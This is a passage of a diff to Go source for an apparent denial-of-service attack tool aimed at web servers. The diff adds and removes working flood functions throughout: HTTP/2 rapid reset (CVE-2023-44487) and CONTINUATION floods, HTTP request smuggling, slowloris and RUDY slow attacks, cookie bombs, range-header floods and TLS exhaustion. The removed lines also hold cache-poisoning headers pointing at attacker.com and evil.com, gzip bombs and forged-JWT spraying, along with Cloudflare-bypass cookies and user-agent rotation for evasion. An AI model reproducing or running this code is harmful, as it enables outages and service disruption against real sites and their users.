-	req.Header.Set("Cookie", "cf_clearance="+randString(43)+"; __cf_bm="+randString(36)+"; _cfuvid="+randString(48))
+	req.Header.Set("Cookie", "cf_clearance="+randString(43)+"; __cf_bm="+randString(36)+"; _cfuvid="+randString(40))
 	atomic.AddInt64(&totalReq, 1)
-	trackMethod("cf-bypass")
 	resp, err := client.Do(req)
 	if err != nil {
 		return false
@@ -792,12 +875,11 @@ func rangeRequest(client *http.Client, targetURL string) bool {
 	}
 	req.Header.Set("User-Agent", randomUserAgent())
 	var ranges []string
-	for i := 0; i < 200; i++ {
-		ranges = append(ranges, fmt.Sprintf("%d-%d", i*512, i*512+511))
+	for i := 0; i < 128; i++ {
+		ranges = append(ranges, fmt.Sprintf("%d-%d", i*1000, i*1000+999))
 	}
 	req.Header.Set("Range", "bytes="+strings.Join(ranges, ","))
 	atomic.AddInt64(&totalReq, 1)
-	trackMethod("range")
 	resp, err := client.Do(req)
 	if err != nil {
 		return false
@@ -815,11 +897,10 @@ func cookieBombRequest(client *http.Client, targetURL string) bool {
 	req.Header.Set("User-Agent", randomUserAgent())
 	var cookies strings.Builder
 	for i := 0; i < 500; i++ {
-		cookies.WriteString(randString(8+rand.Intn(8)) + "=" + randString(64+rand.Intn(64)) + "; ")
+		cookies.WriteString("c" + strconv.Itoa(i) + "=" + randString(100) + "; ")
 	}
 	req.Header.Set("Cookie", cookies.String())
 	atomic.AddInt64(&totalReq, 1)
-	trackMethod("cookie-bomb")
 	resp, err := client.Do(req)
 	if err != nil {
 		return false
@@ -829,382 +910,62 @@ func cookieBombRequest(client *http.Client, targetURL string) bool {
 	return resp.StatusCode < 500
 }
 
-// ─────────────────────────────────────────────
-//  ── NEW EVASION METHODS ──
-// ─────────────────────────────────────────────
-
-// cacheBustRequest rotates cache-busting params + pragma/cache-control combos
-func cacheBustRequest(client *http.Client, targetURL string) bool {
-	cacheBusters := []string{
-		fmt.Sprintf("?cb=%d&_=%s", time.Now().UnixNano(), randString(12)),
-		fmt.Sprintf("?v=%s&nocache=%d", randString(8), rand.Intn(999999)),
-		fmt.Sprintf("?t=%d&r=%s", time.Now().UnixMilli(), randString(6)),
-		fmt.Sprintf("?__cache_bust=%s", randString(16)),
-		fmt.Sprintf("?bust=%d&x=%s", rand.Intn(9999999), randString(8)),
-	}
-	fullURL := targetURL + cacheBusters[rand.Intn(len(cacheBusters))]
-	req, err := http.NewRequest("GET", fullURL, nil)
-	if err != nil {
-		return false
-	}
-	req.Header.Set("User-Agent", randomUserAgent())
-	req.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate, max-age=0")
-	req.Header.Set("Pragma", "no-cache")
-	req.Header.Set("Expires", "0")
-	req.Header.Set("Referer", randomReferer())
-	atomic.AddInt64(&totalReq, 1)
-	trackMethod("cache-bust")
-	resp, err := client.Do(req)
-	if err != nil {
-		return false
-	}
-	io.Copy(io.Discard, resp.Body)
-	resp.Body.Close()
-	return resp.StatusCode < 500
-}
-
-// cachePoisonRequest injects poisoning headers to corrupt CDN caches
-func cachePoisonRequest(client *http.Client, targetURL string) bool {
-	req, err := http.NewRequest("GET", targetURL+randomPath(), nil)
-	if err != nil {
-		return false
-	}
-	req.Header.Set("User-Agent", randomUserAgent())
-	// Classic cache-poisoning vectors
-	poisonHeaders := [][]string{
-		{"X-Forwarded-Host", randString(16) + ".attacker.com"},
-		{"X-Forwarded-Scheme", "nothttps"},
-		{"X-Original-URL", "/admin/" + randString(8)},
-		{"X-Rewrite-URL", "/" + randString(12)},
-		{"X-Override-URL", "https://" + randString(8) + ".com/"},
-		{"Forwarded", "host=" + randString(8) + ".evil.com"},
-		{"X-Custom-IP-Authorization", randomIP()},
-		{"X-Host", randString(12) + ".com"},
-	}
-	for _, h := range poisonHeaders {
-		req.Header.Set(h[0], h[1])
-	}
-	req.Header.Set("Cache-Control", "max-age=86400")
-	atomic.AddInt64(&totalReq, 1)
-	trackMethod("cache-poison")
-	resp, err := client.Do(req)
-	if err != nil {
-		return false
-	}
-	io.Copy(io.Discard, resp.Body)
-	resp.Body.Close()
-	return resp.StatusCode < 500
-}
-
-// originSpoofRequest floods with origin/host mutation to confuse WAF routing
-func originSpoofRequest(client *http.Client, targetURL string) bool {
-	_, host, _, _ := parseTarget(targetURL)
-	req, err := http.NewRequest("GET", targetURL+randomPath(), nil)
-	if err != nil {
-		return false
-	}
-	req.Header.Set("User-Agent", randomUserAgent())
-	spoofedHosts := []string{
-		"localhost",
-		"127.0.0.1",
-		"0.0.0.0",
-		"::1",
-		host + ".evil.com",
-		"internal." + host,
-		"admin." + host,
-		randomIP(),
-	}
-	req.Header.Set("Origin", "https://"+spoofedHosts[rand.Intn(len(spoofedHosts))])
-	req.Header.Set("Host", spoofedHosts[rand.Intn(len(spoofedHosts))])
-	req.Header.Set("X-Forwarded-For", randomIP()+", "+randomIP()+", "+randomIP())
-	req.Header.Set("Referer", "https://"+spoofedHosts[rand.Intn(len(spoofedHosts))]+"/")
-	atomic.AddInt64(&totalReq, 1)
-	trackMethod("origin-spoof")
-	resp, err := client.Do(req)
-	if err != nil {
-		return false
-	}
-	io.Copy(io.Discard, resp.Body)
-	resp.Body.Close()
-	return resp.StatusCode < 500
-}
-
-// etagStormRequest sends rotating If-None-Match / If-Match to force conditional logic
-func etagStormRequest(client *http.Client, targetURL string) bool {
-	req, err := http.NewRequest("GET", targetURL+randomPath(), nil)
-	if err != nil {
-		return false
-	}
-	req.Header.Set("User-Agent", randomUserAgent())
-	// Generate 50 random ETags
-	var etags []string
-	for i := 0; i < 50; i++ {
-		etags = append(etags, `"`+randString(32)+`"`)
-	}
-	req.Header.Set("If-None-Match", strings.Join(etags, ", "))
-	req.Header.Set("If-Match", `"`+randString(32)+`"`)
-	req.Header.Set("If-Modified-Since", time.Unix(rand.Int63n(time.Now().Unix()), 0).UTC().Format(http.TimeFormat))
-	req.Header.Set("If-Unmodified-Since", time.Unix(rand.Int63n(time.Now().Unix()), 0).UTC().Format(http.TimeFormat))
-	atomic.AddInt64(&totalReq, 1)
-	trackMethod("etag-storm")
-	resp, err := client.Do(req)
-	if err != nil {
-		return false
-	}
-	io.Copy(io.Discard, resp.Body)
-	resp.Body.Close()
-	return resp.StatusCode < 500
-}
-
-// acceptFloodRequest mutates Accept-* headers to exhaust content negotiation
-func acceptFloodRequest(client *http.Client, targetURL string) bool {
-	req, err := http.NewRequest("GET", targetURL+randomPath(), nil)
-	if err != nil {
-		return false
-	}
-	req.Header.Set("User-Agent", randomUserAgent())
-	acceptTypes := []string{
-		"application/json", "application/xml", "text/html", "text/plain",
-		"application/octet-stream", "image/webp", "image/avif",
-		"application/pdf", "application/zip", "*/*",
-	}
-	// Randomize 20 accept types with random q values
-	var accepts []string
-	for i := 0; i < 20; i++ {
-		q := float64(rand.Intn(10)) / 10.0
-		accepts = append(accepts, fmt.Sprintf("%s;q=%.1f", acceptTypes[rand.Intn(len(acceptTypes))], q))
-	}
-	req.Header.Set("Accept", strings.Join(accepts, ", "))
-	req.Header.Set("Accept-Language", strings.Join([]string{
-		"en-US;q=0.9", "en;q=0.8", "fr;q=0.7", "de;q=0.6",
-		"ja;q=0.5", "zh-CN;q=0.4", "*;q=0.1",
-	}, ", "))
-	req.Header.Set("Accept-Encoding", "gzip;q=1.0, deflate;q=0.8, br;q=0.7, *;q=0.1")
-	req.Header.Set("Accept-Charset", "utf-8;q=1.0, iso-8859-1;q=0.8, *;q=0.5")
-	atomic.AddInt64(&totalReq, 1)
-	trackMethod("accept-flood")
-	resp, err := client.Do(req)
-	if err != nil {
-		return false
-	}
-	io.Copy(io.Discard, resp.Body)
-	resp.Body.Close()
-	return resp.StatusCode < 500
-}
-
-// gzipBombRequest sends compressed payloads that expand massively on server
-func gzipBombRequest(client *http.Client, targetURL string) bool {
-	bomb := genGzipBombPayload()
-	req, err := http.NewRequest("POST", targetURL+randomPath(), bytes.NewReader(bomb))
-	if err != nil {
-		return false
-	}
-	req.Header.Set("User-Agent", randomUserAgent())
-	req.Header.Set("Content-Type", "application/octet-stream")
-	req.Header.Set("Content-Encoding", "gzip")
-	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
-	req.Header.Set("Transfer-Encoding", "identity")
-	atomic.AddInt64(&totalReq, 1)
-	atomic.AddInt64(&totalBytes, int64(len(bomb)))
-	trackMethod("gzip-bomb")
-	resp, err := client.Do(req)
-	if err != nil {
-		return false
-	}
-	io.Copy(io.Discard, resp.Body)
-	resp.Body.Close()
-	return resp.StatusCode < 500
-}
-
-// jwtSprayRequest floods auth endpoints with forged JWT tokens
-func jwtSprayRequest(client *http.Client, targetURL string) bool {
-	authEndpoints := []string{
-		"/api/v1/auth", "/api/v2/auth", "/api/v1/me", "/api/v1/profile",
-		"/api/v1/admin", "/api/v2/users/me", "/api/v1/refresh",
-		"/oauth/token", "/auth/validate", "/api/token/verify",
-	}
-	endpoint := authEndpoints[rand.Intn(len(authEndpoints))]
-	req, err := http.NewRequest("GET", targetURL+endpoint, nil)
-	if err != nil {
-		return false
-	}
-	req.Header.Set("User-Agent", randomUserAgent())
-	// Rotate auth header style
-	switch rand.Intn(3) {
-	case 0:
-		req.Header.Set("Authorization", "Bearer "+genFakeJWT())
-	case 1:
-		req.Header.Set("Authorization", "Token "+randString(64))
-	case 2:
-		req.Header.Set("Authorization", "Basic "+base64.StdEncoding.EncodeToString([]byte(randString(8)+":"+randString(16))))
-	}
-	req.Header.Set("X-API-Key", randString(32))
-	req.Header.Set("X-Auth-Token", genFakeJWT())
-	req.Header.Set("X-Request-ID", randString(32))
-	atomic.AddInt64(&totalReq, 1)
-	trackMethod("jwt-spray")
-	resp, err := client.Do(req)
-	if err != nil {
-		return false
-	}
-	io.Copy(io.Discard, resp.Body)
-	resp.Body.Close()
-	return resp.StatusCode < 500
-}
-
-// graphqlDepthRequest sends deeply nested GraphQL queries to exhaust resolvers
-func graphqlDepthRequest(client *http.Client, targetURL string) bool {
-	graphqlEndpoints := []string{"/graphql", "/api/graphql", "/gql", "/api/gql", "/v1/graphql"}
-	endpoint := graphqlEndpoints[rand.Intn(len(graphqlEndpoints))]
-	query := graphqlQueries[rand.Intn(len(graphqlQueries))]
-	req, err := http.NewRequest("POST", targetURL+endpoint, strings.NewReader(query))
-	if err != nil {
-		return false
-	}
-	req.Header.Set("User-Agent", randomUserAgent())
-	req.Header.Set("Content-Type", "application/json")
-	req.Header.Set("Accept", "application/json")
-	req.Header.Set("Authorization", "Bearer "+genFakeJWT())
-	req.Header.Set("X-Request-ID", randString(32))
-	atomic.AddInt64(&totalReq, 1)
-	atomic.AddInt64(&totalBytes, int64(len(query)))
-	trackMethod("graphql-depth")
-	resp, err := client.Do(req)
-	if err != nil {
-		return false
-	}
-	io.Copy(io.Discard, resp.Body)
-	resp.Body.Close()
-	return resp.StatusCode < 500
-}
-
-// multipartExhaustRequest floods with enormous multipart form uploads
-func multipartExhaustRequest(client *http.Client, targetURL string) bool {
-	var buf bytes.Buffer
-	mw := multipart.NewWriter(&buf)
-	// Write 20-50 fields with large values
-	n := 20 + rand.Intn(30)
-	for i := 0; i < n; i++ {
-		fw, err := mw.CreateFormField(randString(8+rand.Intn(8)))
-		if err != nil {
-			continue
-		}
-		fw.Write([]byte(randString(1024 + rand.Intn(4096))))
-	}
-	// Write a fake file part
-	fw, _ := mw.CreateFormFile("file", randString(8)+".bin")
-	fw.Write(generatePayload(32768 + rand.Intn(32768)))
-	mw.Close()
-
-	req, err := http.NewRequest("POST", targetURL+randomPath(), &buf)
-	if err != nil {
-		return false
-	}
-	req.Header.Set("User-Agent", randomUserAgent())
-	req.Header.Set("Content-Type", mw.FormDataContentType())
-	atomic.AddInt64(&totalReq, 1)
-	atomic.AddInt64(&totalBytes, int64(buf.Len()))
-	trackMethod("multipart-exhaust")
-	resp, err := client.Do(req)
-	if err != nil {
-		return false
-	}
-	io.Copy(io.Discard, resp.Body)
-	resp.Body.Close()
-	return resp.StatusCode < 500
-}
-
-// retryAfterAbuseRequest hammers endpoints that return 429/503 without backing off
-func retryAfterAbuseRequest(client *http.Client, targetURL string) bool {
-	req, err := http.NewRequest("GET", targetURL+randomPath(), nil)
-	if err != nil {
-		return false
-	}
-	req.Header.Set("User-Agent", randomUserAgent())
-	req.Header.Set("Retry-After", "0")
-	req.Header.Set("X-RateLimit-Reset", "0")
-	req.Header.Set("X-Retry", "1")
-	req.Header.Set("Referer", randomReferer())
-	req.Header.Set("Cache-Control", "no-cache")
-	atomic.AddInt64(&totalReq, 1)
-	trackMethod("retry-after")
-	resp, err := client.Do(req)
-	if err != nil {
-		return false
-	}
-	io.Copy(io.Discard, resp.Body)
-	resp.Body.Close()
-	return resp.StatusCode < 500
-}
-
-// ─────────────────────────────────────────────
-//  ── ADVANCED HTTP/2 METHODS ──
-// ─────────────────────────────────────────────
-
-// h2PriorityFlood sends a storm of PRIORITY frames to exhaust h2 priority queues
-func h2PriorityFlood(targetURL string) error {
-	_, host, p, _ := parseTarget(targetURL)
+func tlsExhaustOnce(host, p string) error {
 	rawConn, err := dialTarget(host, p)
 	if err != nil {
 		return err
 	}
-	tlsConn := tls.Client(rawConn, &tls.Config{
-		ServerName:         host,
-		NextProtos:         []string{"h2"},
-		InsecureSkipVerify: true,
-	})
+	defer rawConn.Close()
+	tlsConfig := randomTLSConfig(host)
+	tlsConn := tls.Client(rawConn, tlsConfig)
 	if err := tlsConn.Handshake(); err != nil {
-		rawConn.Close()
 		return err
 	}
-	defer tlsConn.Close()
-	if tlsConn.ConnectionState().NegotiatedProtocol != "h2" {
-		return fmt.Errorf("h2 not negotiated")
-	}
-	tlsConn.Write([]byte(http2.ClientPreface))
-	bw := bufio.NewWriterSize(tlsConn, 65536)
-	framer := http2.NewFramer(bw, tlsConn)
-	framer.AllowIllegalWrites = true
-	framer.WriteSettings(
-		http2.Setting{ID: http2.SettingMaxConcurrentStreams, Val: 1000},
-	)
-	bw.Flush()
-
-	go func() {
-		for {
-			if _, err := framer.ReadFrame(); err != nil {
-				return
-			}
-		}
-	}()
-
-	// Flood PRIORITY frames on odd stream IDs, all pointing to stream 0
-	for i := 0; i < 500; i++ {
-		sid := uint32(i*2 + 1)
-		framer.WritePriority(sid, http2.PriorityParam{
-			StreamDep: 0,
-			Weight:    uint8(rand.Intn(256)),
-			Exclusive: rand.Intn(2) == 0,
-		})
-		atomic.AddInt64(&totalSuccess, 1)
-		atomic.AddInt64(&totalBytes, 9)
-	}
-	bw.Flush()
-	trackMethod("h2-priority")
+	atomic.AddInt64(&totalSuccess, 1)
+	atomic.AddInt64(&totalReq, 1)
+	time.Sleep(time.Duration(50+rand.Intn(200)) * time.Millisecond)
 	return nil
 }
 
-// rapidResetOnce — CVE-2023-44487, unchanged but now tracked
-func rapidResetOnce(targetURL string) error {
+func httpSmuggleOnce(targetURL string) error {
+	scheme, host, p, path := parseTarget(targetURL)
+	rawConn, err := dialTarget(host, p)
+	if err != nil {
+		return err
+	}
+	var conn net.Conn = rawConn
+	if scheme != "http" {
+		tlsConn := tls.Client(rawConn, &tls.Config{ServerName: host, InsecureSkipVerify: true})
+		if err := tlsConn.Handshake(); err != nil {
+			rawConn.Close()
+			return err
+		}
+		conn = tlsConn
+	}
+	defer conn.Close()
+
+	innerBody := fmt.Sprintf("POST /admin HTTP/1.1\r\nHost: %s\r\nContent-Length: %d\r\n\r\n%s",
+		host, rand.Intn(100)+10, randString(rand.Intn(100)+10))
+	outerLen := len(innerBody) + 6
+	payload := fmt.Sprintf(
+		"POST %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nContent-Length: %d\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n%s",
+		path, host, randomUserAgent(), outerLen, innerBody,
+	)
+	conn.Write([]byte(payload))
+	atomic.AddInt64(&totalReq, 1)
+	atomic.AddInt64(&totalSuccess, 1)
+	atomic.AddInt64(&totalBytes, int64(len(payload)))
+	return nil
+}
+
+func idleH2Once(targetURL string) error {
 	scheme, host, p, path := parseTarget(targetURL)
 	rawConn, err := dialTarget(host, p)
 	if err != nil {
 		return err
 	}
 	tlsConn := tls.Client(rawConn, &tls.Config{
-		ServerName:         host,
-		NextProtos:         []string{"h2"},
-		InsecureSkipVerify: true,
+		ServerName: host, NextProtos: []string{"h2"}, InsecureSkipVerify: true,
 	})
 	if err := tlsConn.Handshake(); err != nil {
 		rawConn.Close()
@@ -1218,29 +979,15 @@ func rapidResetOnce(targetURL string) error {
 	bw := bufio.NewWriterSize(tlsConn, 65536)
 	framer := http2.NewFramer(bw, tlsConn)
 	framer.AllowIllegalWrites = true
-
-	var writeMu sync.Mutex
-	writeMu.Lock()
 	framer.WriteSettings(
-		http2.Setting{ID: http2.SettingMaxConcurrentStreams, Val: 1000},
+		http2.Setting{ID: http2.SettingMaxConcurrentStreams, Val: 2000},
 		http2.Setting{ID: http2.SettingInitialWindowSize, Val: 65535},
 	)
 	bw.Flush()
-	writeMu.Unlock()
-
-	done := make(chan struct{})
 	go func() {
-		defer close(done)
 		for {
-			f, err := framer.ReadFrame()
-			if err != nil {
+			if _, err := framer.ReadFrame(); err != nil {
 				return
-			}
-			if sf, ok := f.(*http2.SettingsFrame); ok && !sf.IsAck() {
-				writeMu.Lock()
-				framer.WriteSettingsAck()
-				bw.Flush()
-				writeMu.Unlock()
 			}
 		}
 	}()
@@ -1255,170 +1002,24 @@ func rapidResetOnce(targetURL string) error {
 	fragment := append([]byte(nil), hdrBuf.Bytes()...)
 
 	var streamID uint32 = 1
-	for i := 0; i < 150; i++ {
-		select {
-		case <-done:
-			return fmt.Errorf("connection closed")
-		default:
-		}
-		writeMu.Lock()
+	for i := 0; i < 200; i++ {
 		framer.WriteHeaders(http2.HeadersFrameParam{
 			StreamID:      streamID,
 			BlockFragment: fragment,
-			EndStream:     true,
+			EndStream:     false,
 			EndHeaders:    true,
 		})
-		framer.WriteRSTStream(streamID, http2.ErrCodeCancel)
-		bw.Flush()
-		writeMu.Unlock()
 		atomic.AddInt64(&totalReq, 1)
 		atomic.AddInt64(&totalSuccess, 1)
-		atomic.AddInt64(&totalBytes, int64(len(fragment)+18))
-		trackMethod("rapid-reset")
 		streamID += 2
 		if streamID >= 1<<31-1 {
 			break
 		}
 	}
-	time.Sleep(5 * time.Millisecond)
-	return nil
-}
-
-func h2ContOnce(targetURL string) error {
-	scheme, host, p, path := parseTarget(targetURL)
-	rawConn, err := dialTarget(host, p)
-	if err != nil {
-		return err
-	}
-	tlsConn := tls.Client(rawConn, &tls.Config{
-		ServerName:         host,
-		NextProtos:         []string{"h2"},
-		InsecureSkipVerify: true,
-	})
-	if err := tlsConn.Handshake(); err != nil {
-		rawConn.Close()
-		return err
-	}
-	defer tlsConn.Close()
-	if tlsConn.ConnectionState().NegotiatedProtocol != "h2" {
-		return fmt.Errorf("h2 not negotiated")
-	}
-	tlsConn.Write([]byte(http2.ClientPreface))
-	bw := bufio.NewWriterSize(tlsConn, 65536)
-	framer := http2.NewFramer(bw, tlsConn)
-	framer.AllowIllegalWrites = true
-	framer.WriteSettings()
 	bw.Flush()
-	go func() {
-		for {
-			if _, err := framer.ReadFrame(); err != nil {
-				return
-			}
-		}
-	}()
-	var hdrBuf bytes.Buffer
-	enc := hpack.NewEncoder(&hdrBuf)
-	enc.WriteField(hpack.HeaderField{Name: ":method", Value: "GET"})
-	enc.WriteField(hpack.HeaderField{Name: ":path", Value: path})
-	enc.WriteField(hpack.HeaderField{Name: ":scheme", Value: scheme})
-	enc.WriteField(hpack.HeaderField{Name: ":authority", Value: host})
-	enc.WriteField(hpack.HeaderField{Name: "user-agent", Value: randomUserAgent()})
-	fragment := append([]byte(nil), hdrBuf.Bytes()...)
-	framer.WriteHeaders(http2.HeadersFrameParam{
-		StreamID:      1,
-		BlockFragment: fragment,
-		EndStream:     false,
-		EndHeaders:    false,
-	})
-	for i := 0; i < 3000; i++ {
-		if err := framer.WriteContinuation(1, false, fragment); err != nil {
-			bw.Flush()
-			return nil
-		}
-		atomic.AddInt64(&totalSuccess, 1)
-		atomic.AddInt64(&totalBytes, int64(len(fragment)))
-		trackMethod("h2-cont")
-	}
-	bw.Flush()
+	time.Sleep(2 * time.Second)
 	return nil
 }
-
-// httpPipelineFlood sends pipelined HTTP/1.1 requests without waiting for responses
-func httpPipelineFlood(targetURL string) error {
-	_, host, p, _ := parseTarget(targetURL)
-	rawConn, err := dialTarget(host, p)
-	if err != nil {
-		return err
-	}
-	tlsConn := tls.Client(rawConn, &tls.Config{
-		ServerName:         host,
-		InsecureSkipVerify: true,
-	})
-	if err := tlsConn.Handshake(); err != nil {
-		rawConn.Close()
-		return err
-	}
-	defer tlsConn.Close()
-	var buf strings.Builder
-	// Pack 50 pipelined requests in one write
-	for i := 0; i < 50; i++ {
-		path := randomPath()
-		ua := randomUserAgent()
-		fmt.Fprintf(&buf, "GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n",
-			path, host, ua)
-		atomic.AddInt64(&totalReq, 1)
-	}
-	payload := buf.String()
-	tlsConn.Write([]byte(payload))
-	atomic.AddInt64(&totalBytes, int64(len(payload)))
-	atomic.AddInt64(&totalSuccess, 50)
-	trackMethod("http-pipeline")
-	// Drain whatever comes back
-	tlsConn.SetReadDeadline(time.Now().Add(2 * time.Second))
-	io.Copy(io.Discard, tlsConn)
-	return nil
-}
-
-// tlsFragmentFlood sends fragmented TLS records to stress TLS state machines
-func tlsFragmentFlood(host, p string) error {
-	addr := net.JoinHostPort(host, p)
-	rawConn, err := net.DialTimeout("tcp", addr, 5*time.Second)
-	if err != nil {
-		return err
-	}
-	defer rawConn.Close()
-
-	// Craft a minimal TLS ClientHello and split it across multiple records
-	// Record header: type=22 (handshake), version=0x0301 (TLS 1.0), length
-	clientHello := []byte{
-		0x16, 0x03, 0x01, 0x00, 0x2f, // TLS record header
-		0x01, 0x00, 0x00, 0x2b, // Handshake: ClientHello
-		0x03, 0x03, // TLS 1.2
-	}
-	// Append 32 random bytes for random
-	clientHello = append(clientHello, generatePayload(32)...)
-	// session id len = 0, cipher suites len = 2, one cipher, compression = 0
-	clientHello = append(clientHello, 0x00, 0x00, 0x02, 0x00, 0x2f, 0x01, 0x00)
-
-	// Send in 3-byte fragments (illegal fragmentation)
-	for i := 0; i < len(clientHello); i += 3 {
-		end := i + 3
-		if end > len(clientHello) {
-			end = len(clientHello)
-		}
-		rawConn.Write(clientHello[i:end])
-		time.Sleep(5 * time.Millisecond)
-	}
-	atomic.AddInt64(&totalReq, 1)
-	atomic.AddInt64(&totalSuccess, 1)
-	atomic.AddInt64(&totalBytes, int64(len(clientHello)))
-	trackMethod("tls-fragment")
-	return nil
-}
-
-// ─────────────────────────────────────────────
-//  ── SLOW METHODS ──
-// ─────────────────────────────────────────────
 
 type slowReader struct {
 	data  []byte
@@ -1450,8 +1051,8 @@ func (r *chunkDripReader) Read(p []byte) (int, error) {
 	select {
 	case <-r.stop:
 		return 0, io.EOF
-	case <-time.After(time.Duration(300+rand.Intn(1200)) * time.Millisecond):
-		n := copy(p, []byte(randString(rand.Intn(16)+4)))
+	case <-time.After(time.Duration(500+rand.Intn(1500)) * time.Millisecond):
+		n := copy(p, []byte(randString(10)))
 		return n, nil
 	}
 }
@@ -1461,7 +1062,7 @@ func rudyRequest(client *http.Client, targetURL string, stop <-chan struct{}) bo
 	chunk := []byte("comment=" + randString(50) + "&" + randString(10) + "=" + randString(20) + "&")
 	slow := &slowReader{
 		data:  chunk,
-		delay: time.Duration(400+rand.Intn(1600)) * time.Millisecond,
+		delay: time.Duration(500+rand.Intn(2000)) * time.Millisecond,
 		stop:  stop,
 	}
 	req, err := http.NewRequest("POST", targetURL+randomPath(), slow)
@@ -1475,7 +1076,6 @@ func rudyRequest(client *http.Client, targetURL string, stop <-chan struct{}) bo
 	req.Header.Set("Connection", "keep-alive")
 	req.Header.Set("Referer", randomReferer())
 	atomic.AddInt64(&totalReq, 1)
-	trackMethod("rudy")
 	resp, err := client.Do(req)
 	if err != nil {
 		return false
@@ -1496,7 +1096,6 @@ func chunkPostRequest(client *http.Client, targetURL string, stop <-chan struct{
 	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
 	req.Header.Set("Connection", "keep-alive")
 	atomic.AddInt64(&totalReq, 1)
-	trackMethod("chunk-post")
 	resp, err := client.Do(req)
 	if err != nil {
 		return false
@@ -1504,6 +1103,157 @@ func chunkPostRequest(client *http.Client, targetURL string, stop <-chan struct{
 	io.Copy(io.Discard, resp.Body)
 	resp.Body.Close()
 	return resp.StatusCode < 500
+}
+
+func rapidResetOnce(targetURL string) error {
+	scheme, host, p, path := parseTarget(targetURL)
+	rawConn, err := dialTarget(host, p)
+	if err != nil {
+		return err
+	}
+	tlsConn := tls.Client(rawConn, &tls.Config{
+		ServerName: host, NextProtos: []string{"h2"}, InsecureSkipVerify: true,
+	})
+	if err := tlsConn.Handshake(); err != nil {
+		rawConn.Close()
+		return err
+	}
+	defer tlsConn.Close()
+	if tlsConn.ConnectionState().NegotiatedProtocol != "h2" {
+		return fmt.Errorf("h2 not negotiated")
+	}
+	tlsConn.Write([]byte(http2.ClientPreface))
+	bw := bufio.NewWriterSize(tlsConn, 65536)
+	framer := http2.NewFramer(bw, tlsConn)
+	framer.AllowIllegalWrites = true
+
+	var writeMu sync.Mutex
+	writeMu.Lock()
+	framer.WriteSettings(
+		http2.Setting{ID: http2.SettingMaxConcurrentStreams, Val: 1000},
+		http2.Setting{ID: http2.SettingInitialWindowSize, Val: 65535},
+	)
+	bw.Flush()
+	writeMu.Unlock()
+
+	done := make(chan struct{})
+	go func() {
+		defer close(done)
+		for {
+			f, err := framer.ReadFrame()
+			if err != nil {
+				return
+			}
+			if sf, ok := f.(*http2.SettingsFrame); ok {
+				if !sf.IsAck() {
+					writeMu.Lock()
+					framer.WriteSettingsAck()
+					bw.Flush()
+					writeMu.Unlock()
+				}
+			}
+		}
+	}()
+
+	var hdrBuf bytes.Buffer
+	enc := hpack.NewEncoder(&hdrBuf)
+	enc.WriteField(hpack.HeaderField{Name: ":method", Value: "GET"})
+	enc.WriteField(hpack.HeaderField{Name: ":path", Value: path})
+	enc.WriteField(hpack.HeaderField{Name: ":scheme", Value: scheme})
+	enc.WriteField(hpack.HeaderField{Name: ":authority", Value: host})
+	enc.WriteField(hpack.HeaderField{Name: "user-agent", Value: randomUserAgent()})
+	fragment := append([]byte(nil), hdrBuf.Bytes()...)
+
+	var streamID uint32 = 1
+	for i := 0; i < 100; i++ {
+		select {
+		case <-done:
+			return fmt.Errorf("connection closed")
+		default:
+		}
+		writeMu.Lock()
+		err1 := framer.WriteHeaders(http2.HeadersFrameParam{
+			StreamID:      streamID,
+			BlockFragment: fragment,
+			EndStream:     true,
+			EndHeaders:    true,
+		})
+		err2 := framer.WriteRSTStream(streamID, http2.ErrCodeCancel)
+		bw.Flush()
+		writeMu.Unlock()
+		if err1 != nil || err2 != nil {
+			return fmt.Errorf("write error")
+		}
+		atomic.AddInt64(&totalReq, 1)
+		atomic.AddInt64(&totalSuccess, 1)
+		atomic.AddInt64(&totalBytes, int64(len(fragment)+18))
+		streamID += 2
+		if streamID >= 1<<31-1 {
+			break
+		}
+	}
+	time.Sleep(10 * time.Millisecond)
+	return nil
+}
+
+func h2ContOnce(targetURL string) error {
+	scheme, host, p, path := parseTarget(targetURL)
+	rawConn, err := dialTarget(host, p)
+	if err != nil {
+		return err
+	}
+	tlsConn := tls.Client(rawConn, &tls.Config{
+		ServerName: host, NextProtos: []string{"h2"}, InsecureSkipVerify: true,
+	})
+	if err := tlsConn.Handshake(); err != nil {
+		rawConn.Close()
+		return err
+	}
+	defer tlsConn.Close()
+	if tlsConn.ConnectionState().NegotiatedProtocol != "h2" {
+		return fmt.Errorf("h2 not negotiated")
+	}
+	tlsConn.Write([]byte(http2.ClientPreface))
+	bw := bufio.NewWriterSize(tlsConn, 65536)
+	framer := http2.NewFramer(bw, tlsConn)
+	framer.AllowIllegalWrites = true
+	framer.WriteSettings()
+	bw.Flush()
+	go func() {
+		for {
+			if _, err := framer.ReadFrame(); err != nil {
+				return
+			}
+		}
+	}()
+
+	var hdrBuf bytes.Buffer
+	enc := hpack.NewEncoder(&hdrBuf)
+	enc.WriteField(hpack.HeaderField{Name: ":method", Value: "GET"})
+	enc.WriteField(hpack.HeaderField{Name: ":path", Value: path})
+	enc.WriteField(hpack.HeaderField{Name: ":scheme", Value: scheme})
+	enc.WriteField(hpack.HeaderField{Name: ":authority", Value: host})
+	enc.WriteField(hpack.HeaderField{Name: "user-agent", Value: randomUserAgent()})
+	fragment := append([]byte(nil), hdrBuf.Bytes()...)
+
+	if err := framer.WriteHeaders(http2.HeadersFrameParam{
+		StreamID:      1,
+		BlockFragment: fragment,
+		EndStream:     false,
+		EndHeaders:    false,
+	}); err != nil {
+		return err
+	}
+	for i := 0; i < 2000; i++ {
+		if err := framer.WriteContinuation(1, false, fragment); err != nil {
+			bw.Flush()
+			return nil
+		}
+		atomic.AddInt64(&totalSuccess, 1)
+		atomic.AddInt64(&totalBytes, int64(len(fragment)))
+	}
+	bw.Flush()
+	return nil
 }
 
 func slowlorisOnce(targetURL string, stop <-chan struct{}) bool {
@@ -1521,24 +1271,26 @@ func slowlorisOnce(targetURL string, stop <-chan struct{}) bool {
 		}
 		conn = tlsConn
 	}
-	fmt.Fprintf(conn, "GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\n", host, randomUserAgent())
+	fmt.Fprintf(conn, "GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\n", randomPath(), host, randomUserAgent())
 	ticker := time.NewTicker(time.Duration(1+rand.Intn(3)) * time.Second)
 	defer ticker.Stop()
-	for {
